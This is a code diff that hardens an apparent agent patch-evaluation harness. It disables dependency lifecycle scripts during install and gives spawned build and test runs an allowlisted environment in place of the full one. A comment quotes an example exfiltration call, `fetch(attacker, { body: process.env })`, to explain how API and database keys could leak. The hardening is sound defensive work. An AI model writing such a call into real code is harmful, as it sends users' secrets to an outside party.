@@ -146,7 +146,10 @@ export async function evaluateCodePatch(
       };
     }
 
-    const installed = await exec(["bun", "install"], { cwd: pkgDir, timeoutMs: t.installMs });
+    // `--ignore-scripts`: re-installing the existing dependency tree runs every
+    // dependency's lifecycle scripts, in a worktree holding code the agent just
+    // wrote. Nothing about evaluating a patch needs them to run.
+    const installed = await exec(["bun", "install", "--ignore-scripts"], { cwd: pkgDir, timeoutMs: t.installMs });
     if (installed.exitCode !== 0) {
       return {
         ok: false,
@@ -242,6 +245,61 @@ function resolveCmd(cmd: string[]): string[] {
   return head === "bunx" ? [bun, "x", ...rest] : [bun, ...rest];
 }
 
+/**
+ * The environment a candidate patch's build and test run is allowed to see.
+ *
+ * This used to be `{ ...process.env }` — the sidecar's whole environment,
+ * handed to code the agent wrote itself and has not reviewed. That includes
+ * `FERAL_API_KEY` (the bearer token for this machine's runtime), `FERAL_DB_KEY`
+ * (the at-rest key for semantic memory, which holds whatever the user has said),
+ * and whatever provider keys the user exported in the shell that launched
+ * Feral. One `fetch(attacker, { body: process.env })` inside a test file and
+ * they are gone — and the crash watchdog's revert cannot un-send them.
+ *
+ * `crates/feral-core/src/tools.rs` already does this correctly for the
+ * `code_execute` tool (`env_clear()` plus PATH); this is the same rule applied
+ * to the place that runs far less trusted code.
+ *
+ * ponytail: an allowlist, deliberately. A denylist of "the secret ones" needs
+ * updating every time a new secret is added, and the day it is forgotten is the
+ * day it leaks.
+ */
+function minimalEnv(): Record<string, string> {
+  const env: Record<string, string> = {};
+  const keep = [
+    "PATH",
+    "HOME",
+    // bun/node need these to find their own install and a scratch dir.
+    "BUN_INSTALL",
+    "XDG_CACHE_HOME",
+    "LANG",
+    "LC_ALL",
+    "TZ",
+    // Windows: without these a spawned process cannot locate its runtime.
+    "SYSTEMROOT",
+    "SYSTEMDRIVE",
+    "WINDIR",
+    "TEMP",
+    "TMP",
+    "PATHEXT",
+    "COMSPEC",
+    "USERPROFILE",
+    "APPDATA",
+    "LOCALAPPDATA",
+    "PROGRAMFILES",
+    "PROGRAMDATA",
+  ];
+  for (const key of keep) {
+    const value = process.env[key];
+    if (value != null) env[key] = value;
+  }
+  // Tests that legitimately need a flag can be given one explicitly here; the
+  // point is that nothing arrives by accident.
+  env.CI = "1";
+  env.NODE_ENV = "test";
+  return env;
+}
+
 /** Production ExecFn: Bun.spawn with a kill timer. timedOut → exitCode -2
  *  (same convention as process-sandbox.ts). */
 export async function bunExec(
@@ -251,7 +309,7 @@ export async function bunExec(
   const proc = Bun.spawn({
     cmd: resolveCmd(cmd),
     cwd: opts.cwd,
-    env: { ...process.env },
+    env: minimalEnv(),
     stdin: opts.stdin != null ? "pipe" : "ignore",
     stdout: "pipe",
     stderr: "pipe",
